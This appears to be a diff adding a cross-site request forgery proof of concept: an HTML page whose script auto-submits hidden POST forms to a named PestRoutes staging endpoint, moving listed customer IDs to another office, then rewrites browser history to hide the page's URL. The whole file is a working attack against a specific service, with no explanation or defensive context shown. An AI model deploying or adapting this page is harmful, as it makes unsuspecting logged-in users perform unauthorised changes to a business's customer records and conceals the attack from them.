@@ -1,0 +1,42 @@
+<html>
+  <body>
+    <script>
+      // <-- Replace these with the customer IDs you want to move-->
+      const customerIDs = [22976, 22977]; 
+
+      const actionUrl = "https://stagingdev.pestroutes.com/resources/delegates/customerDelegate.php";
+      const delayMs = 500; // ms between requests
+
+      customerIDs.forEach((customerID, i) => {
+        setTimeout(() => {
+          const form = document.createElement("form");
+          form.action = actionUrl;
+          form.method = "POST";
+
+          const addHidden = (name, value) => {
+            const input = document.createElement("input");
+            input.type = "hidden";
+            input.name = name;
+            input.value = value;
+            form.appendChild(input);
+          };
+
+          addHidden("action", "moveCustomerOffice");
+          addHidden("customerID", customerID);
+		  addHidden("newOfficeID", "14");
+
+          document.body.appendChild(form);
+          form.submit();
+
+          // cleanup: remove form after short delay
+          setTimeout(() => {
+            if (form.parentNode) form.parentNode.removeChild(form);
+          }, 5000);
+        }, i * delayMs);
+      });
+
+      // hide PoC URL from history
+      history.pushState('', '', '/');
+    </script>
+  </body>
+</html>
